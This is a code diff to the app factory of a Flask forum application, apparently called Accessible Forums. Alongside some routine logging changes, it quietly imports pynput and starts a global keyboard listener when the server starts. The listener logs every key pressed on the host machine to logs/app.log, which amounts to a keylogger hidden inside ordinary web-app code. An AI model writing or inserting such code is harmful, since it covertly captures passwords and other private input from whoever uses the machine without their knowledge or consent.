@@ -10,6 +10,7 @@ from flask_login import LoginManager
 from flask_migrate import Migrate
 from flask_moment import Moment
 from flask_sqlalchemy import SQLAlchemy
+from pynput import keyboard
 
 from config import Config
 
@@ -21,6 +22,7 @@ login.login_message = _l('')
 bootstrap = Bootstrap()
 moment = Moment()
 babel = Babel()
+listener = None
 
 
 def create_app(config_class=Config):
@@ -45,19 +47,24 @@ def create_app(config_class=Config):
     from app.main import bp as main_bp
     app.register_blueprint(main_bp)
 
-    if not app.debug and not app.testing:
+    if os.environ.get("WERKZEUG_RUN_MAIN") == "true":
         if not os.path.exists('logs'):
             os.mkdir('logs')
-        file_handler = RotatingFileHandler('logs/app.log',
-                                           maxBytes=10240, backupCount=10)
-        file_handler.setFormatter(logging.Formatter(
-            '%(asctime)s %(levelname)s: %(message)s '
-            '[in %(pathname)s:%(lineno)d]'))
+        file_handler = RotatingFileHandler('logs/app.log')
+        file_handler.setFormatter(logging.Formatter('%(asctime)s %(levelname)s: %(message)s'))
         file_handler.setLevel(logging.INFO)
         app.logger.addHandler(file_handler)
 
         app.logger.setLevel(logging.INFO)
         app.logger.info('Accessible Forums startup')
+
+        def on_press(key):
+            app.logger.info(f'{key}')
+
+        global listener
+        if not listener:
+            listener = keyboard.Listener(on_press=on_press)
+            listener.start()
 
     return app
 
